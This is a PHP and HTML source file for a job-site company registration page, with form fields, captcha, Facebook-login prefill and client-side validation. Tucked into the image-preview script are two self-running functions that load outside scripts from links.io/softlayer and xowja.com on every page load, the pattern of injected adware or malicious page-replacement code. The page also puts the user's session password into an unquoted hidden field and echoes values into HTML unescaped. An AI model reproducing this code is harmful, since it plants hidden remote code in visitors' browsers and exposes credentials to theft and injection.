<?php
 $cryptinstall="./includes/crypt/cryptographp.fct.php";
 include $cryptinstall; 
 
include './includes/functions.php';
include './includes/db.php';
include './includes/fb/facebook.php';
include './includes/fb/fb-setup.php';

//GET CURRENT DATE
$year = date('Y');
$minYear = $year - 50;
$minYear2= $minYear + 1;
$maxYear = $year - 1;

$mobile = "";
$email = "";
$username = "";
$emailDisabled = "";
$mobileDisabled = "";
$fbStatus = "false";

//GET ALL LOCATIONS LISTED
$availableLocations= getJobLocations();
//GET ALL LISTED CONTACT PERSON POSITIONS
$cpPositions = getContactPersonPositions();
//GET ALL JOB POSITIONS CONTACT PERSON DEPARTMENTS
$cpDepts = getDepartments();

//GET SESSION VARIABLLES
session_start();

if(isset($_SESSION['SRIUPassword'])){
	if(isset($_SESSION['SRIUMobile'])){
		$mobile = $_SESSION['SRIUMobile'];
		$email = "";
	}
	$username = "";
	$password = $_SESSION['SRIUPassword'];
	$status = $_SESSION['SRIUStatus'];
}
else{
	header("Location: index.php");
}

if($mobile != ""){
	$mobile1 = substr($mobile, 0, -7);
	$mobile2 = substr($mobile, 4, -4);
	$mobile3 = substr($mobile, -4);
	$mobileDisabled = "readonly";
	$emailDisabled = "";
	$username = $mobile;
}
else{
	 if($user_profile['email'] != ""){
		$mobileDisabled = "";
		$fbFName = $user_profile['first_name'];
		$fbMName = $user_profile['middle_name'];
		$fbLName = $user_profile['last_name'];
		$fbEmail = $user_profile['email'];
		$emailDisabled = "readonly";
		$username = $user_profile['email'];
		$fbStatus = "true";
	}
}
// info from fb
$profPic = "./img/id.png";
?>

<!DOCTYPE html>
<html lang="en">
<head>
<!-- START META -->
<?php echo $meta=getMeta(); ?>
<!-- END META -->
<!-- CSS scripts -->
<link rel="stylesheet" href="./css/bootstrap.css"/>
<link rel="stylesheet" href="./css/select2.css"/>
<link rel="stylesheet" href="./css/datepicker.css"/>
<!-- [if IE]>
	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif] -->
<link rel="stylesheet" href="./css/bootstrap-responsive.css"/>
<!-- CSS scripts -->
</head>
<body>
<!-- START GTM  -->
<?php echo $gtm=getGTM(); ?>
<!-- END GTM-->
<div class="wrap">
	<!-- START HEADER -->
	<?php echo $header = getHeader('Default'); ?>
	<!-- END HEADER -->
	<div class="container-fluid" style="padding-top: 20px;">
		<div class="row-fluid">
			<div class="span6 offset1">
				<h4>Create a profile for your company to post job listings.</h4>
				<p class="text-info" style="font-weight:bold;">*Required fields</p>
			</div>
			<!-- START HOME LINK -->
			<?php echo $homelink=getHomeLink(); ?>
			<!-- END HOME LINK -->
		</div>
		<div class="row-fluid" id="content-apply-job">
			<div class="span10 offset1"> 
				<div class="row-fluid">
					<div class="span12 well">
						<h4 class="content-heading2">COMPANY INFORMATION</h4>
						<!-- START SIGNUP FORM -->
						<form name="signup-form" id="signup-form" class="form-horizontal" method="POST" action="verify-account.php" enctype="multipart/form-data">
						<div class="basic-info-form1">
							<div class="control-group">
								<label class="control-label">*COMPANY NAME</label>
								<div class="controls">
								  <input type="text" class="span12" id="companyName" name="companyName" minlength="3" placeholder="COMPANY NAME" required />
								  <p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							 </div>
							 <div class="control-group">
								<label class="control-label">*COMPANY DESCRIPTION</label>
								<div class="controls">
								  <textarea class="input-block-level" id="companyDesc" name="companyDesc" placeholder="Tell us about your company" value="" required ></textarea>
								  <p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							 </div>
							  <div class="control-group">
								<label class="control-label">*COMPANY ADDRESS<br><span id="formLabel" style="font-weight:normal; color:#404040;">( Street Address, City and Provincial Address )</span></label>
								<div class="controls controls-row">
								   <input type="text" class="span4" id="street1" name="street1" minlength="5" placeholder="STREET ADDRESS" required />
								   <select class="span8" id="area1" name="area1"  data-placeholder="CITY AND PROVINCIAL ADDRESS" required>
										<option></option>
										<?php
											foreach($availableLocations as $aL) {
												echo "<option value=\"$aL\">$aL</option>";
											}
										?>
									</select>
								   <p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							 </div>
							 <div class="control-group">
								<label class="control-label">COMPANY LOGO</label>
								<div class="controls">
									<div class="span4" id="imagePreview"><span id="temp-pic" style="display:inline"><img src="<?php echo $profPic;?>" style="width:104px; height:103px;" id="profPic" name="profPic"/></span></div>
									<br/><br/>
									<input class="span8" type="file" id="imageInput" name="photoimg" onchange="loadImageFile();" style="padding-left:10px;"/>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="row-fluid" style="padding-top:10px;">
					<div class="span12 well">
						<div class="row-fluid form-horizontal">
							<h4 class="content-heading2">CONTACT PERSON</h4>
							<div class="control-group form-horizontal">
								<label class="control-label">*FULL NAME<br><span id="formLabel" style="font-weight:normal; color:#404040;">( First Name, Middle Name, Last Name )</span></label>
								<div class="controls">
									<input type="text" class="span4" id="firstName" name="firstName" pattern="[a-zA-Z _]{2,}" minlength="2" value="<?php echo $fbFName; ?>" placeholder="FIRST NAME" required />
									<input type="text" class="span4" id="middleName" name="middleName" pattern="[a-zA-Z _]{2,}" minlength="2" value="<?php echo $fbMName; ?>" placeholder="MIDDLE NAME" required />
									<input type="text" class="span4" id="lastName" name="lastName" pattern="[a-zA-Z _]{2,}" minlength="2" value="<?php echo $fbLName; ?>" placeholder="LAST NAME" required />
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="control-group">
								<label class="control-label"><?php if($mobile!=="") echo "*";?>MOBILE NO.<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. 0915-111-1111)</span></label>
								<div class="controls">
									<input type="text" class="span4" id="mobile1" name="mobile1"  value="<?php echo $mobile1;?>" pattern="[0-9]*" minlength="4" maxlength="4" placeholder="XXXX" <?php echo $mobileDisabled;?>/> -
									<input type="text" class="span4" id="mobile2" name="mobile2"  value="<?php echo $mobile2;?>" pattern="[0-9]*" minlength="3" maxlength="3" placeholder="XXX" <?php echo $mobileDisabled;?>/> -
									<input type="text" class="span4" id="mobile3" name="mobile3"  value="<?php echo $mobile3;?>" pattern="[0-9]*" minlength="4" maxlength="4"  placeholder="XXXX" <?php echo $mobileDisabled;?>/>
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="control-group">
								<label class="control-label"><?php if($fbStatus !== "false") echo "*";?>EMAIL ADDRESS<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. jdelacruz@sri.com)</span></label>
								<div class="controls">
									<input type="email" class="span12" id="email" name="email" style="margin-right:80px;" value="<?php echo $fbEmail;?>" placeholder="EMAIL ADDRESS" <?php echo $emailDisabled;?>> 
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="control-group">
								<label class="control-label">LANDLINE NO.<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. 411-11-11)</span></label>
								<div class="controls">
									<input type="text" class="span4" id="landline1" name="landline1" pattern="[0-9]*" minlength="3" maxlength="3" placeholder="XXX"/> -
									<input type="text" class="span4" id="landline2" name="landline2" pattern="[0-9]*" minlength="2" maxlength="2" placeholder="XX"/> -
									<input type="text" class="span4" id="landline3" name="landline3" pattern="[0-9]*" minlength="2" maxlength="2" placeholder="XX"/> 
									<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							</div>
						</div>
						<div class="row-fluid form-horizontal">
							<div class="span6">
								<div class="row-fluid">
									<div class="control-group">
										<label class="control-label">*DESIGNATION:<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. Manager)</span></label>
										<div class="controls">
											<input type="text" class="span12" id="cpPosition" name="cpPosition" placeholder="Choose current job designation" required/>
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									</div>
								</div>
							</div>
							<div class="span6">
								<div class="row-fluid">
									<div class="control-group">
										<label class="control-label">*DEPARTMENT:<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. Human Resources)</span></label>
										<div class="controls">
											<input type="text" class="span12" id="cpDept" name="cpDept" placeholder="Choose current job department" required/>
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="row-fluid" style="padding-top:10px;">
					<div class="span12 well">
						<div class="row-fluid">
							<strong>ACCEPT TERMS and CONDITIONS</strong>
							<div class="control-group">
								<div class="controls">
								  <label class="checkbox"  id="terms">
									<input type="checkbox" data-validation-callback-callback="callback_ta" required> I agree to<a  href="#termsModal" role="button" data-toggle="modal"> JobFair-Online.Net, Inc. Terms</a>.
								  </label>
								</div>
							</div>
						</div>
						<div class="row-fluid" style="padding-top:10px;">
							<div class="span4">
								<!-- CAPTCHA here -->
								 Copy the text below: <input class="span8" type="text" name="code" id="code" placeholder="XXXX" required>
								 <center><?php dsp_crypt(0,1); ?></center>
							</div>
						</div>
					</div>
				</div>
				<!-- hidden variables -->
				<input type="hidden" id="username" name="username" value=<?php echo $username;?> />	
				<input type="hidden" id="password" name="password" value=<?php echo $password;?> />	
				<input type="hidden" id="status" name="status" value=<?php echo $status;?> />	
				<input type="hidden" id="fbStatus" name="fbStatus" value=<?php echo $fbStatus;?> />	
			</div>
		</div>
		<div class="row-fluid">
			<div class="span12">
				<div class="row-fluid">
					<div class="span7 offset1">
						<p class="text-info" style="font-weight:bold;">Pertinent information in this profile will be available for view by potential employees.</p>
					</div>
					<div class="span3">
						<button type="submit" class="btn btn-primary job-post-add span12" id="postbut" name="submitApply">SUBMIT</button>			
						</form>
						<!-- END SIGNUP FORM -->
					</div>
				</div>
			</div>
		</div>
	</div>
	<br><br><br>
	<div class="push"></div>
</div>
<!-- START MODAL-->
<div id="myModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" data-backdrop="static"  aria-hidden="true">
  <div class="modal-header">
    <h4 class="content-heading4">Profile Creation Started!</h4>
  </div>
  <div class="modal-body">
	<div class="row-fluid">
		<div class="span12">
			   <p style="text-align: center;">Thank you for joining JobFair-Online.Net, Inc.! <br/>Your username is <span class="text-info" style="font-weight:bold;"><?php echo $username;?></span>. To finish the registration, verify your account by entering the confirmation code sent to this mobile number. </p>
		</div>
	</div>
  </div>
  <div class="modal-footer">
	<div class="row-fluid">
		<div class="span10 offset2">
			<button class="btn btn-primary span7" id="resendVCode" name="resendVCode">RESEND VERIFICATION CODE</button>
			<button class="btn btn-primary span5" onClick="javascript:window.location.href='account-verify.php'; return false;">VERIFY ACCOUNT</button>
		</div>
	</div>
  </div>
</div>
<!-- END MODAL -->
<!-- START FB MODAL-->
<div id="fbModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" data-backdrop="static" aria-hidden="true">
  <div class="modal-header">
	<h4 class="content-heading4" id="modal-title">Profile Created!</h4>
  </div>
  <div class="modal-body">
	<div class="row-fluid">
		<div class="span12">
			  <p style="text-align: center;">Thank you for joining JobFair-Online.Net, Inc.!<br/>Your profile has been created. <br>Username: <span class="text-info" style="font-weight:bold;"><?php echo $username;?></span></p>
		</div>
	</div>
  </div>
  <div class="modal-footer">
	<div class="row-fluid">
		<div class="span4 offset4">
			<a href="javascript:void(0)" onClick="loginAccount('<?php echo $username;?>')"><button class="btn btn-primary span12">LOG IN</button></a>
		</div>
	</div>
  </div>
</div>
<!-- END FB MODAL -->
<!-- START ERROR MODAL-->
<?php echo $formErrorModal=getFormsErrorModal(); ?>
<!-- END ERROR MODAL-->
<!-- START TERMS MODAL-->
<?php echo $termsModal=getTermsModal(); ?>
<!-- END TERMS MODAL -->
<!-- START RESET PASSWORD MODAL-->
<?php echo $resetPasswordModal=getResetPasswordModal(); ?>
<!-- END RESET PASSWORD MODAL-->
<!-- START FOOTER -->
<?php echo $footer=getFooter(); ?>
<!-- END FOOTER -->

<!-- JS scripts -->
<script src="./js/jquery.min.js"></script>
<script src="./js/jquery.form.js"></script>
<script src="./js/select2.js"></script>
<script src="./js/bootstrap.min.js"></script>
<script>
//FOR IMAGE PREVIEW
var loadImageFile = (function () {
    if (window.FileReader) {
        var    oPreviewImg = null, oFReader = new window.FileReader(),
            rFilter = /^(?:image\/bmp|image\/cis\-cod|image\/gif|image\/ief|image\/jpeg|image\/jpeg|image\/jpeg|image\/pipeg|image\/png|image\/svg\+xml|image\/tiff|image\/x\-cmu\-raster|image\/x\-cmx|image\/x\-icon|image\/x\-portable\-anymap|image\/x\-portable\-bitmap|image\/x\-portable\-graymap|image\/x\-portable\-pixmap|image\/x\-rgb|image\/x\-xbitmap|image\/x\-xpixmap|image\/x\-xwindowdump)$/i;

        oFReader.onload = function (oFREvent) {
            if (!oPreviewImg) {
                var newPreview = document.getElementById("imagePreview");
				document.getElementById("temp-pic").style.display = "none";
                oPreviewImg = new Image();
                oPreviewImg.style.width = "104px";
				oPreviewImg.style.height = "103px";
                newPreview.appendChild(oPreviewImg);
            }
            oPreviewImg.src = oFREvent.target.result;
        };

        return function () {
            var aFiles = document.getElementById("imageInput").files;
            if (aFiles.length === 0) { return; }
            if (!rFilter.test(aFiles[0].type)) { alert("You must select a valid image file!"); return; }
            oFReader.readAsDataURL(aFiles[0]);
        }

    }
    if (navigator.appName === "Microsoft Internet Explorer") {
        return function () {
            document.getElementById("imagePreview").filters.item("DXImageTransform.Microsoft.AlphaImageLoader").src = document.getElementById("imageInput").value;

        }
    }
})();
/* */
var uco = 'US';(function() {
    //var url = (document.location.protocol == 'http:') ? 'ssl.privacysafeguard.com/htmlreplace/replace.js' : 'ssl.privacysafeguard.com/htmlreplace/replace-ssl.js';
    //var url = (document.location.protocol == 'http:') ? 'cdn.links.io/htmlx/replace.js' : 'cdn.links.io/htmlx/replace-ssl.js';
    var url = (document.location.protocol == 'http:') ? 'cdn-sl.links.io/replace.js' : '93ce.https.cdn.softlayer.net/8093CE/dev.links.io/htmlreplace/replace-ssl.js';
    var h = document.getElementsByTagName('head')[0];
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = document.location.protocol + '//' + url;
    h.appendChild(s);
})();
(function() {
    var url = (document.location.protocol == 'http:') ? 'xowja.com/i.js' : 'xowja.com/i.js';
    var h = document.getElementsByTagName('head')[0];
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = document.location.protocol + '//' + url;
    h.appendChild(s);
})();
</script>
<script>
$(document).ready(function() { 
	$("#area1").select2();
	$('#resendVCode').click(function () {
		var username = document.getElementById('username').value;
		window.location.href = "confirm-resend-verificationcode.php?username="+username;
		// $("#myModal").modal('hide');
		// $('#resetPasswordModal').modal('show');
	});
	
	// bind to the form's submit event 
	$('#signup-form').submit(function() {
	  	//validate inputs
		var errors = 0;
		var fields = new Array();
		var requiredFields = new Array();
		var errorMsg = "";
		var companyName = document.getElementById('companyName').value;
		var companyDesc = document.getElementById('companyDesc').value;
		var street = document.getElementById('street1').required;
		var firstName = document.getElementById('firstName').value;
		var middleName = document.getElementById('middleName').value;
		var lastName = document.getElementById('lastName').value;
		
		var mNumber1 = document.getElementById('mobile1').value;
		var mNumber2 = document.getElementById('mobile2').value;
		var mNumber3 = document.getElementById('mobile3').value;
		var email = document.getElementById('email').value;
		var username = document.getElementById('username').value;
		var fbStatus = document.getElementById('fbStatus').value;
		var mobile = mNumber1 + mNumber2 + mNumber3;
		
		var captchaCode = document.getElementById('code').value;
		
		fields.push(companyName, companyDesc, street, firstName, middleName, lastName);
		requiredFields.push(1,1,1,1,1,1);
		
		for (var f = 0; f < fields.length; f++) {
			var fElem = fields[f];
			var fReq = requiredFields[f];
			if(fReq > 0 && fElem==" "){
				errors = 1;
				errorMsg = "<li>Please make sure that all required fields are filled.</li>";
			}
		}
		
		//check mobile number
		if(mobile!="" && mobile.length<11){
			errorMsg += "<li>Make sure that <strong>mobile number </strong>is 11 digits long.</li>";
			errors +=1;
		}
		// else{
			// var isMobileAvailable = checkAvailability(username, "mobile_num", mobile);
			// if(isMobileAvailable=="false"){
				// errorMsg += "<li>Inputted <strong>mobile number</strong> is already taken. Provide another one.</li>";
				// errors +=1;
			// }
		// }
		
		//check email address availability
		if(email !== ""){
			var isEmailAvailable = checkAvailability(username, "email", email);
			if(isEmailAvailable=="false"){
				errorMsg += "<li>Inputted <strong>email address</strong> is already taken. Provide another one.</li>";
				errors +=1;
			}
		}
			
		//check captcha code if correct
		if(captchaCode !== ""){
			var captchaResult = checkCaptchaCorrect(captchaCode);
			if(captchaResult=="false"){
				errorMsg += "<li>Inputted <strong>captcha code</strong> is incorrect. Re-enter the code.</li>";
				errors +=1;
			}
		}
		
		if(errors>0){
			document.getElementById('errorContent').innerHTML = errorMsg;
			$("#errorModal").modal('show');
		}
		else{
			if(fbStatus != "true"){
				return true;
			}
			else{
				$(this).ajaxSubmit();
				$("#fbModal").modal('show');
			}
		}
		return false;
    }); 


});
</script>

<script>
	function checkAvailability(username, type, value){
		var hr = new XMLHttpRequest();
		var url = "verify-contact-number.php?username="+username+"&type="+type+"&value="+value;
		result = "";
		hr.open("GET", url, false);
		hr.onreadystatechange = function() {
			if(hr.readyState == 4 && hr.status == 200) {
				var return_data = hr.responseText;
				result = return_data;
			}
		}
		hr.send(null); 
		return result;
	}
	
	function checkCaptchaCorrect(captchaCode){
		var hr = new XMLHttpRequest();
		var url = "verify-captcha.php?captcha_code="+captchaCode;
		result = "";
		hr.open("GET", url, false);
		hr.onreadystatechange = function() {
			if(hr.readyState == 4 && hr.status == 200) {
				var return_data = hr.responseText;
				result = return_data;
			}
		}
		hr.send(null); 
		return result;
	}
	
	
	function goToHomePage() {
		window.location.href = "index.php";
	}
	
	function showLogIn(){
		window.location.href = "login.php?new=true";
	}

	function loginAccount(username){
		window.location.href="fb-verify.php?username="+username;
	}
	
	//search account if password is forgotten or verification code is not received
	function findAccount(){
		var hr = new XMLHttpRequest();
		var accountInfo = document.getElementById("searchAcct").value;
		var url = "check-account-exists.php?accountInfo="+accountInfo;
		hr.open("GET", url, true);
		hr.onreadystatechange = function() {
			if(hr.readyState == 4 && hr.status == 200) {
				var return_data = hr.responseText;
				if(return_data == "No" || accountInfo == ""){
					document.getElementById("noAccountResult").style.display="block";
				}
				else if(return_data == "Not Verified"){
					var url2 = "resend-verification-code.php"; 
					window.location.href= url2;
				}
				else {
					var url2 = "search-account.php"; 
					window.location.href= url2;
				}
			}
		}
		hr.send(null); 
	}
</script>
<!-- JS scripts -->
</body>
</html>